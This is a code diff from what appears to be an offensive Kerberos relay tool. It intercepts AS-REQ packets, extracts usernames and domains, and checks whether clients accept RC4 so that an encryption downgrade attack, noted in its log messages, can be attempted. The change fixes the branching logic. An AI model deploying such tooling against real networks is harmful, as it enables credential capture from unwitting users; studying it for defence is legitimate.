@@ -192,15 +192,16 @@ async def relay_to_dc(data, client_address):
     host = dc
     port = 88
     kerberos_packet = KerberosTCPHeader(data)
-    if kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 and ASN1_INTEGER(23) in kerberos_packet.root.reqBody.etype :
+    if kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 :
         decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
         username = decoder.read()[1].decode().lower()
         decoder.start(bytes(kerberos_packet.root.reqBody.realm))
         domain = decoder.read()[1].decode().lower()
-        if username not in UsernamesCaptured :
-            logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
-    elif kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 and ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype :
-        logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
+        if ASN1_INTEGER(23) in kerberos_packet.root.reqBody.etype :
+            if username not in UsernamesCaptured :
+                logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
+        else :
+            logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
     client_socket.sendall(data)
